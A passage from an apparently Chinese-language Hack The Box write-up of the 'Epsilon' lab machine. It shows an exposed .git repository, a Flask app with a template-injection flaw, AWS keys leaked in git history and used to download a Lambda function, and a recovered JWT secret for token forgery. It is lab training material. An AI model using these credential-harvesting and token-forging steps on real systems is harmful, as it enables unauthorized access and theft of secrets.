http://10.10.11.134/.git/refs/heads/<br>[08:25:10] 403 -  277B  - /.git/objects/<br>[08:25:10] 301 -  321B  - /.git/refs/tags  -&gt;  http://10.10.11.134/.git/refs/tags/<br>[08:25:10] 403 -  277B  - /.git/refs/<br>[08:25:10] 200 -   41B  - /.git/refs/heads/master<br>[08:25:11] 403 -  277B  - /.ht_wsr.txt<br>[08:25:11] 403 -  277B  - /.htaccess.bak1<br>[08:25:11] 403 -  277B  - /.htaccess.sample<br>[08:25:11] 403 -  277B  - /.htaccess.save<br>[08:25:11] 403 -  277B  - /.htaccess.orig<br>[08:25:11] 403 -  277B  - /.htaccessOLD<br>[08:25:11] 403 -  277B  - /.htaccess_extra<br>[08:25:11] 403 -  277B  - /.htaccessOLD2<br>[08:25:11] 403 -  277B  - /.html<br>[08:25:11] 403 -  277B  - /.htaccess_orig<br>[08:25:11] 403 -  277B  - /.htaccessBAK<br>[08:25:11] 403 -  277B  - /.htaccess_sc<br>[08:25:11] 403 -  277B  - /.htm<br>[08:25:11] 403 -  277B  - /.htpasswd_test<br>[08:25:11] 403 -  277B  - /.httr-oauth<br>[08:25:11] 403 -  277B  - /.htpasswds<br>[08:25:13] 403 -  277B  - /.php<br>[08:26:16] 403 -  277B  - /server-status/<br>[08:26:16] 403 -  277B  - /server-status<br></code></pre></td></tr></table></figure><p>目录都是git。5000端口运行着一个应用。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823082753546.png" alt="image-20220823082753546"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -I 10.10.11.134:5000  <br>HTTP/1.0 200 OK<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 3550<br>Server: Werkzeug/2.0.2 Python/3.8.10<br>Date: Tue, 23 Aug 2022 00:29:07 GMT<br></code></pre></td></tr></table></figure><p>python环境。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs clean">Crazy:~/HackThebox$ feroxbuster -u http:<span class="hljs-comment">//10.10.11.134:5000/ -e</span><br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="hljs-number">2.7</span><span class="hljs-number">.0</span><br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http:<span class="hljs-comment">//10.10.11.134:5000/</span><br> 🚀  Threads               │ <span class="hljs-number">50</span><br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [<span class="hljs-number">200</span>, <span class="hljs-number">204</span>, <span class="hljs-number">301</span>, <span class="hljs-number">302</span>, <span class="hljs-number">307</span>, <span class="hljs-number">308</span>, <span class="hljs-number">401</span>, <span class="hljs-number">403</span>, <span class="hljs-number">405</span>, <span class="hljs-number">500</span>]<br> 💥  Timeout (secs)        │ <span class="hljs-number">7</span><br> 🦡  User-Agent            │ feroxbuster/<span class="hljs-number">2.7</span><span class="hljs-number">.0</span><br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ true<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ <span class="hljs-number">4</span><br> 🎉  New Version Available │ https:<span class="hljs-comment">//github.com/epi052/feroxbuster/releases/latest</span><br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br><span class="hljs-number">302</span>      GET        <span class="hljs-number">4</span>l       <span class="hljs-number">24</span>w      <span class="hljs-number">208</span>c http:<span class="hljs-comment">//10.10.11.134:5000/home =&gt; http://10.10.11.134:5000/</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">545</span>l     <span class="hljs-number">2833</span>w   <span class="hljs-number">120412</span>c http:<span class="hljs-comment">//10.10.11.134:5000/static/img/costume.jpg</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">205</span>l      <span class="hljs-number">358</span>w     <span class="hljs-number">3550</span>c http:<span class="hljs-comment">//10.10.11.134:5000/</span><br><span class="hljs-number">302</span>      GET        <span class="hljs-number">4</span>l       <span class="hljs-number">24</span>w      <span class="hljs-number">208</span>c http:<span class="hljs-comment">//10.10.11.134:5000/order =&gt; http://10.10.11.134:5000/</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">565</span>l     <span class="hljs-number">3002</span>w   <span class="hljs-number">173706</span>c http:<span class="hljs-comment">//10.10.11.134:5000/static/img/ico.png</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">234</span>l      <span class="hljs-number">454</span>w     <span class="hljs-number">4288</span>c http:<span class="hljs-comment">//10.10.11.134:5000/track</span><br>[####################] - <span class="hljs-number">3</span>m     <span class="hljs-number">30006</span>/<span class="hljs-number">30006</span>   <span class="hljs-number">0</span>s      found:<span class="hljs-number">6</span>       errors:<span class="hljs-number">0</span>      <br>[####################] - <span class="hljs-number">3</span>m     <span class="hljs-number">30000</span>/<span class="hljs-number">30000</span>   <span class="hljs-number">160</span>/s   http:<span class="hljs-comment">//10.10.11.134:5000/ </span><br></code></pre></td></tr></table></figure><p>有个轻危未授权：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823083316035.png" alt="image-20220823083316035"></p><p>但不管点什么都会因为鉴权失败跳转回登录页面。看来突破口似乎在git中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ git reset --hard<br>HEAD 现在位于 c622771 Fixed Typo<br>Crazy:~/HackThebox$ git status <br>位于分支 master<br>Crazy:~/HackThebox$ <span class="hljs-built_in">ls</span><br>server.py  track_api_CR_148.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>secret = <span class="hljs-string">&#x27;&lt;secret_key&gt;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_jwt</span>(<span class="hljs-params">token,key</span>):<br><span class="hljs-keyword">try</span>:<br>username=jwt.decode(token,key,algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>,])[<span class="hljs-string">&#x27;username&#x27;</span>]<br><span class="hljs-keyword">if</span> username:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&quot;POST&quot;</span>:<br><span class="hljs-keyword">if</span> request.form[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> request.form[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&quot;admin&quot;</span>:<br>res = make_response()<br>username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>token=jwt.encode(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,secret,algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>res.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>,token)<br>res.headers[<span class="hljs-string">&#x27;location&#x27;</span>]=<span class="hljs-string">&#x27;/home&#x27;</span><br><span class="hljs-keyword">return</span> res,<span class="hljs-number">302</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/home&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br><span class="hljs-keyword">if</span> verify_jwt(request.cookies.get(<span class="hljs-string">&#x27;auth&#x27;</span>),secret):<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;home.html&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>,code=<span class="hljs-number">302</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/track&quot;</span>,methods=[<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">track</span>():<br><span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&quot;POST&quot;</span>:<br><span class="hljs-keyword">if</span> verify_jwt(request.cookies.get(<span class="hljs-string">&#x27;auth&#x27;</span>),secret):<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;track.html&#x27;</span>,message=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>,code=<span class="hljs-number">302</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;track.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/order&#x27;</span>,methods=[<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>():<br><span class="hljs-keyword">if</span> verify_jwt(request.cookies.get(<span class="hljs-string">&#x27;auth&#x27;</span>),secret):<br><span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&quot;POST&quot;</span>:<br>costume=request.form[<span class="hljs-string">&quot;costume&quot;</span>]<br>message = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Your order of &quot;&#123;&#125;&quot; has been placed successfully.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(costume)<br>tmpl=render_template_string(message,costume=costume)<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;order.html&#x27;</span>,message=tmpl)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;order.html&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>,code=<span class="hljs-number">302</span>)<br>app.run(debug=<span class="hljs-string">&#x27;true&#x27;</span>)<br></code></pre></td></tr></table></figure><p>代码中admin：admin似乎可以工作，但实际情况不行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">costume=request.form[<span class="hljs-string">&quot;costume&quot;</span>]<br>message = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">Your order of &quot;&#123;&#125;&quot; has been placed successfully.</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>.format(costume)<br>tmpl=render_template_string(message,costume=costume)<br></code></pre></td></tr></table></figure><p>存在SSTI。查看git历史：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ git <span class="hljs-built_in">log</span> --oneline<br>c622771 (HEAD -&gt; master) Fixed Typo<br>b10dd06 Adding Costume Site<br>c514416 Updatig Tracking API<br>7cf92a7 Adding Tracking API Module<br>Crazy:~/HackThebox$ git diff c514416 7cf92a7 <br>diff --git a/track_api_CR_148.py b/track_api_CR_148.py<br>index 545f6fe..fed7ab9 100644<br>--- a/track_api_CR_148.py<br>+++ b/track_api_CR_148.py<br>@@ -5,8 +5,8 @@ from boto3.session import Session<br> <br> <br> session = Session(<br>-    aws_access_key_id=<span class="hljs-string">&#x27;&lt;aws_access_key_id&gt;&#x27;</span>,<br>-    aws_secret_access_key=<span class="hljs-string">&#x27;&lt;aws_secret_access_key&gt;&#x27;</span>,<br>+    aws_access_key_id=<span class="hljs-string">&#x27;AQLA5M37BDN6FJP76TDC&#x27;</span>,<br>+    aws_secret_access_key=<span class="hljs-string">&#x27;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#x27;</span>,<br>     region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span>,<br>     endpoint_url=<span class="hljs-string">&#x27;http://cloud.epsilong.htb&#x27;</span>)<br> aws_lambda = session.client(<span class="hljs-string">&#x27;lambda&#x27;</span>)    <br></code></pre></td></tr></table></figure><p>aws秘钥泄露了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ aws configure<br>AWS Access Key ID [****************cnRz]: AQLA5M37BDN6FJP76TDC<br>AWS Secret Access Key [****************cnRz]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A<br>Default region name [None]: us-east-1<br>Default output format [None]: <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb<br>&#123;<br>    <span class="hljs-string">&quot;Functions&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;FunctionName&quot;</span>: <span class="hljs-string">&quot;costume_shop_v1&quot;</span>,<br>            <span class="hljs-string">&quot;FunctionArn&quot;</span>: <span class="hljs-string">&quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;python3.7&quot;</span>,<br>            <span class="hljs-string">&quot;Role&quot;</span>: <span class="hljs-string">&quot;arn:aws:iam::123456789012:role/service-role/dev&quot;</span>,<br>            <span class="hljs-string">&quot;Handler&quot;</span>: <span class="hljs-string">&quot;my-function.handler&quot;</span>,<br>            <span class="hljs-string">&quot;CodeSize&quot;</span>: 478,<br>            <span class="hljs-string">&quot;Description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Timeout&quot;</span>: 3,<br>            <span class="hljs-string">&quot;LastModified&quot;</span>: <span class="hljs-string">&quot;2022-08-23T00:12:09.968+0000&quot;</span>,<br>            <span class="hljs-string">&quot;CodeSha256&quot;</span>: <span class="hljs-string">&quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;</span>,<br>            <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-variable">$LATEST</span>&quot;</span>,<br>            <span class="hljs-string">&quot;VpcConfig&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;TracingConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Mode&quot;</span>: <span class="hljs-string">&quot;PassThrough&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;RevisionId&quot;</span>: <span class="hljs-string">&quot;c9caf63e-082d-4458-a26b-0a7bd216ee51&quot;</span>,<br>            <span class="hljs-string">&quot;State&quot;</span>: <span class="hljs-string">&quot;Active&quot;</span>,<br>            <span class="hljs-string">&quot;LastUpdateStatus&quot;</span>: <span class="hljs-string">&quot;Successful&quot;</span>,<br>            <span class="hljs-string">&quot;PackageType&quot;</span>: <span class="hljs-string">&quot;Zip&quot;</span><br>        &#125;<br>    ]<br>&#125;<br>                                                                                                                                        <br>Crazy:~/HackThebox$ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb <br>&#123;<br>    <span class="hljs-string">&quot;Configuration&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;FunctionName&quot;</span>: <span class="hljs-string">&quot;costume_shop_v1&quot;</span>,<br>        <span class="hljs-string">&quot;FunctionArn&quot;</span>: <span class="hljs-string">&quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;</span>,<br>        <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;python3.7&quot;</span>,<br>        <span class="hljs-string">&quot;Role&quot;</span>: <span class="hljs-string">&quot;arn:aws:iam::123456789012:role/service-role/dev&quot;</span>,<br>        <span class="hljs-string">&quot;Handler&quot;</span>: <span class="hljs-string">&quot;my-function.handler&quot;</span>,<br>        <span class="hljs-string">&quot;CodeSize&quot;</span>: 478,<br>        <span class="hljs-string">&quot;Description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Timeout&quot;</span>: 3,<br>        <span class="hljs-string">&quot;LastModified&quot;</span>: <span class="hljs-string">&quot;2022-08-23T00:12:09.968+0000&quot;</span>,<br>        <span class="hljs-string">&quot;CodeSha256&quot;</span>: <span class="hljs-string">&quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;</span>,<br>        <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-variable">$LATEST</span>&quot;</span>,<br>        <span class="hljs-string">&quot;VpcConfig&quot;</span>: &#123;&#125;,<br>        <span class="hljs-string">&quot;TracingConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Mode&quot;</span>: <span class="hljs-string">&quot;PassThrough&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RevisionId&quot;</span>: <span class="hljs-string">&quot;c9caf63e-082d-4458-a26b-0a7bd216ee51&quot;</span>,<br>        <span class="hljs-string">&quot;State&quot;</span>: <span class="hljs-string">&quot;Active&quot;</span>,<br>        <span class="hljs-string">&quot;LastUpdateStatus&quot;</span>: <span class="hljs-string">&quot;Successful&quot;</span>,<br>        <span class="hljs-string">&quot;PackageType&quot;</span>: <span class="hljs-string">&quot;Zip&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;Code&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;Location&quot;</span>: <span class="hljs-string">&quot;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;Tags&quot;</span>: &#123;&#125;<br>&#125;<br>                                                                                                                                        <br>Crazy:~/HackThebox$ <br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Crazy</span><span class="hljs-symbol">:~/HackThebox</span><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/cloud.epsilon.htb/</span><span class="hljs-number">2015</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span>/functions/costume_shop_v1/code      <br>--<span class="hljs-number">2022</span>-08-<span class="hljs-number">23</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span>--  <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/cloud.epsilon.htb/</span><span class="hljs-number">2015</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span>/functions/costume_shop_v1/code<br>正在解析主机 cloud.epsilon.htb (cloud.epsilon.htb)... <span class="hljs-number">10.10</span>.<span class="hljs-number">11.134</span><br>正在连接 cloud.epsilon.htb (cloud.epsilon.htb)|<span class="hljs-params">10.10.11.134</span>|<span class="hljs-symbol">:</span><span class="hljs-number">80</span>... 已连接。<br>已发出 <span class="hljs-variable constant_">HTTP</span> 请求，正在等待回应... <span class="hljs-number">200</span> <br>长度：<span class="hljs-number">478</span> [application/zip]<br>正在保存至: “code”<br><br>code                              <span class="hljs-number">100</span><span class="hljs-string">%[=============================================================&gt;]</span>     <span class="hljs-number">478</span>  --.-<span class="hljs-variable constant_">KB</span>/s  用时 0s      <br><br><span class="hljs-number">2022</span>-08-<span class="hljs-number">23</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span>08 (<span class="hljs-number">17.5</span> <span class="hljs-variable constant_">MB</span>/s) - 已保存 “code” [<span class="hljs-number">478</span>/<span class="hljs-number">478</span>])<br><br>                                                                                                                                        <br><span class="hljs-title class_">Crazy</span><span class="hljs-symbol">:~/HackThebox</span><span class="hljs-variable">$ </span>ls<br>code  <span class="hljs-title class_">Epsilon</span>  lab_Mosaictheory.ovpn  server.py  track_api_CR_148.py<br>                                                                                                                                        <br><span class="hljs-title class_">Crazy</span><span class="hljs-symbol">:~/HackThebox</span><span class="hljs-variable">$ </span>file code     <br><span class="hljs-symbol">code:</span> <span class="hljs-title class_">Zip</span> archive data, at least v2.<span class="hljs-number">0</span> to extract, compression method=deflate<br>                                                                                                                                        <br><span class="hljs-title class_">Crazy</span><span class="hljs-symbol">:~/HackThebox</span><span class="hljs-variable">$ </span>unzip code           <br><span class="hljs-title class_">Archive</span>:  code<br>  <span class="hljs-symbol">inflating:</span> lambda_function.py      <br>                           <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>secret=<span class="hljs-string">&#x27;RrXCv`mrNe!K!4+5`wYq&#x27;</span> <span class="hljs-comment">#apigateway authorization for CR-124</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;Beta release for tracking&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lambda_handler</span>(<span class="hljs-params">event, context</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">id</span>=event[<span class="hljs-string">&#x27;queryStringParameters&#x27;</span>][<span class="hljs-string">&#x27;order_id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span>:<br>            <span class="hljs-keyword">return</span> &#123;<br>               <span class="hljs-string">&#x27;statusCode&#x27;</span>: <span class="hljs-number">200</span>,<br>               <span class="hljs-string">&#x27;body&#x27;</span>: json.dumps(<span class="hljs-built_in">str</span>(resp)) <span class="hljs-comment">#dynamodb tracking for CR-342</span><br>            &#125;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&#x27;statusCode&#x27;</span>: <span class="hljs-number">500</span>,<br>                <span class="hljs-string">&#x27;body&#x27;</span>: json.dumps(<span class="hljs-string">&#x27;Invalid Order ID&#x27;</span>)<br>            &#125;<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&#x27;statusCode&#x27;</span>: <span class="hljs-number">500</span>,<br>                <span class="hljs-string">&#x27;body&#x27;</span>: json.dumps(<span class="hljs-string">&#x27;Invalid Order ID&#x27;</span>)<br>            &#125;<br><br></code></pre></td></tr></table></figure><p>似乎找到了秘钥：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=<span class="hljs-string">&#x27;RrXCv`mrNe!K!4+5`wYq&#x27;</span><br></code></pre></td></tr></table></figure><p>伪造JWT令牌根据这段代码就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&quot;POST&quot;</span>:<br><span class="hljs-keyword">if</span> request.form[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&quot;admin&quot;</span> <span 